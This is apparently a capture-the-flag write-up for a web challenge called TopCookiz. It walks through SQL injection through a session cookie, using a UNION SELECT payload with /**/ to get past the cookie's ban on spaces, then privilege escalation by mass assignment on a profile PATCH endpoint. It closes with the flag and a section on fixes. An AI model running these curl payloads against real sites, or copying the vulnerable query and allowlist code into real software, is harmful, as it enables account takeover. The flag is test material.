# TopCookiz — Writeup

**Category:** Web
**Difficulty:** Medium
**Flag format:** `TopCookiz{...}`

## Scenario

TopCookiz is a cookie-factory's internal stock management tool, used by
clerks to track batches of cookies and by admins to oversee everything.
You've been given a login page and nothing else. Get into the admin
dashboard.

## Stage 0 — Recon

The app has:
- `/login` — username/password form
- `/stock` — authenticated view of cookie batches, shows your own user row
- `/admin/dashboard` — admin-only page with the flag
- `/api/profile` (PATCH) — lets a logged-in user update their own profile

Session handling is cookie-based: after login you get `auth_token=<uuid>`.
There's no registration, so you need to either find valid creds or break
the auth check itself.

## Stage 1 — SQL injection in the session cookie

Every request that needs a user looks the session up like this
(`app.py`):

```python
token = request.cookies.get("auth_token")
query = f"SELECT * FROM users WHERE auth_token = '{token}'"
cur = db.execute(query)
```

The token is taken straight from the cookie and concatenated into the
query — no parameter binding. This is reachable on *any* authenticated
route (`/stock`, `/api/profile`, `/admin/dashboard`), even by an
anonymous visitor, because you fully control the `auth_token` cookie
value yourself; you don't need a valid session first.

Break out of the string with a `'`, and close the query with a comment:

```
auth_token = x' OR '1'='1
```

That alone logs you in as whichever row SQLite returns first (`admin`,
id 1) — already game over in a sloppier build. Here it's still useful
as a sanity check, but the *intended* path uses `UNION SELECT` to
pull data out of the `users` table instead of just blindly matching a
row, so you can specifically target `J0eHarr7`'s password rather than
relying on row ordering:

```
x' UNION SELECT 1, password, username, 'employee', 1 FROM users WHERE username='J0eHarr7' -- 
```

Breaking that down:
- `x'` closes the original quoted value with an obviously-false match.
- `UNION SELECT 1, password, username, 'employee', 1 FROM users WHERE username='J0eHarr7'`
  pulls J0eHarr7's row but swaps `password` into the `username` column
  position, so it renders in the page wherever the app prints the
  logged-in user's name.
- `--` comments out the trailing `'` the app appends.

The `users` table is `(id, username, password, role, auth_token)` — 5
columns — so the UNION needs exactly 5 selected values, matching types
loosely enough for SQLite not to complain.

**Gotcha — no raw spaces in the payload.** A cookie is transport, and
modern HTTP libraries (Werkzeug included) parse cookie *values* against
RFC 6265's strict grammar: an unquoted value can't contain a literal
space. If you paste a payload with normal spaces into `--cookie`, the
server silently drops the **entire** cookie (not just the bad part) —
you just get redirected to `/login` with no error, which looks like
the bug doesn't exist. Use SQL's `/**/` inline comment anywhere you'd
normally put a space; SQLite treats it as whitespace, so the query
still parses fine:

```bash
curl --cookie "auth_token=x'/**/UNION/**/SELECT/**/1,password,username,'employee',1/**/FROM/**/users/**/WHERE/**/username='J0eHarr7'--" \
     http://TARGET:5000/stock
```

The page renders:

```
Logged in as <b>C00ki3M4st3r_2024!</b> — role: employee — id: 1
```

That's not really J0eHarr7's username — it's his password, sitting in
the slot the template normally uses to print the username. You now
have valid credentials:

```
username: J0eHarr7
password: C00ki3M4st3r_2024!
```

## Stage 2 — Legit login

```bash
curl -c jar.txt -d "username=J0eHarr7&password=C00ki3M4st3r_2024!" http://TARGET:5000/login
```

You're now a normal authenticated employee. Hitting `/admin/dashboard`
gives a clean `403 — Not an admin`. J0eHarr7 really is just a clerk.

## Stage 3 — Business logic flaw: mass assignment on `/api/profile`

`/api/profile` (PATCH) exists so a clerk can update their own profile
fields. Looking at the handler:

```python
allowed_columns = {"username", "password", "role"}
updates = {k: v for k, v in data.items() if k in allowed_columns}
...
db.execute(f"UPDATE users SET {set_clause} WHERE id = ?", values)
```

The "allowlist" includes `role` — a self-service endpoint has no
business letting a user change their own privilege level, but there's
no extra check here that only an existing admin can set `role`. This
is a classic mass-assignment / broken access control bug: the right
fix would be to allow `role` edits only when the *caller* is already
an admin, not just allowlist the column name.

Exploit it directly:

```bash
curl -b jar.txt -X PATCH -H "Content-Type: application/json" \
     -d '{"role":"admin"}' http://TARGET:5000/api/profile
```

Response: `{"status":"ok","updated":["role"]}`

## Stage 4 — Flag

```bash
curl -b jar.txt http://TARGET:5000/admin/dashboard
```

```
TopCookiz{c00k13_j4r_1s_n3v3r_s4f3_fr0m_4_un10n_s3l3ct}
```

## Automated solve

```bash
pip install requests
python3 solve.py http://TARGET:5000
```

## Root causes & fixes (for the "lessons learned" section)

1. **Session lookups must never use raw string interpolation.** Use
   parameterized queries (`?` placeholders) for *every* query that
   touches attacker-influenced input, including cookies/headers, not
   just form fields.
2. **Don't trust client-supplied cookie values as authorization
   artifacts** without validating them server-side first (format
   check, then parameterized lookup).
3. **Mass assignment:** never build an "allowed fields" list for a
   self-service endpoint that includes privileged columns like `role`
   or `is_admin`. Separate "update my own profile" from "change
   privileges," and gate the latter behind an explicit
   `current_user.role == 'admin'` check — never infer permission from
   which fields happen to be present in the request body.
